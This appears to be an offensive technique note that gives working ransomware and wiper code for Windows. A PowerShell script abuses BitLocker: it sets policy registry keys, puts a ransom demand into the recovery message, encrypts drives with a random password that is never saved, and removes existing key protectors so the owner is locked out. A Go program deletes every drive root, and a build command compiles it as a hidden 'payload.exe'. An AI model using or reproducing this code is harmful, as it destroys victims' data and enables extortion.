# Encrypt Operating System

## Scripting

### PowerShell

```powershell
$Message = "please Visit my hacker site https://yourscrewed.hahaha to give me money"

# Set registry first
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name EnableBDEWithNoTPM -Type DWord -Value 1
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name UseAdvancedStartup -Type DWord -Value 1
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name UseTPM -Type DWord -Value 2
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name UseTPMKey -Type DWord -Value 2
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name UseTPMKeyPIN -Type DWord -Value 2

# Change the recovery message to meet your needs
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name RecoveryKeyMessage -Type String -Value $Message
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name RecoveryKeyMessageSource -Type DWord -Value 2
Set-ItemProperty -Force -Path HKLM:\SOFTWARE\Policies\Microsoft\FVE -Name UseTPMPIN -Type DWord -Value 2

$Drives = Get-PSDrive -PSProvider 'FileSystem'

foreach ($Drive in $Drives) {
    $Check = Get-BitLockerVolume -MountPoint $Env:SystemDrive
    $Status = $Check.ProtectionStatus

    # Randomized password
    $PlainPassword = -join ((33..126) | Get-Random -Count 32 | ForEach-Object { [char]$_ })
    $SecurePassword = $PlainPassword | ConvertTo-SecureString -AsPlainText -Force

    # Check if BitLocker is already enabled on the system drive
    if ($Status -eq 'Off') {
        # Enable BitLocker, Encrypt the used space on the C: drive
        Enable-BitLocker -EncryptionMethod Aes256 -Password $SecurePassword -MountPoint $Drive -PasswordProtector -SkipHardwareTest -UsedSpaceOnly

        # Create a recovery key (inaccessible)
        Add-BitLockerKeyProtector -MountPoint $Env:SystemDrive -RecoveryKeyProtector -RecoveryKeyPath $Env:SystemDrive\
    }

    # If BitLocker is already enabled on the system drive. The following will execute,
    # removing all passwords and recovery keys. Then adding our own password.
    if ($Status -eq 'On') {
        # Strip all Passwords and Recovery keys
        $IDS = $Check.KeyProtector.KeyProtectorID

        foreach ($ID in $IDS) {
            Remove-BitLockerKeyProtector -MountPoint $Env:SystemDrive -KeyProtectorID $ID
        }

        # Add my own passwords
        Add-BitLockerKeyProtector -MountPoint $Drive -PasswordProtector -Password $SecurePassword
        Resume-BitLocker -MountPoint $Env:SystemDrive
    }
}
```

### Go

```go
package main

import (
    "fmt"
    "os"
)

func main() {
    for i := 65; i <= 90; i++ {
        _, err := os.Stat(string(i) + ":\\")

        if err == nil {
            diskDriverRoot := fmt.Sprintf("%c:\\", i)
            os.RemoveAll(diskDriverRoot)
        }
    }
}
```

Compile the payload

```
$ GOOS=windows go build -ldflags -H=windowsgui -o payload.exe main.go
```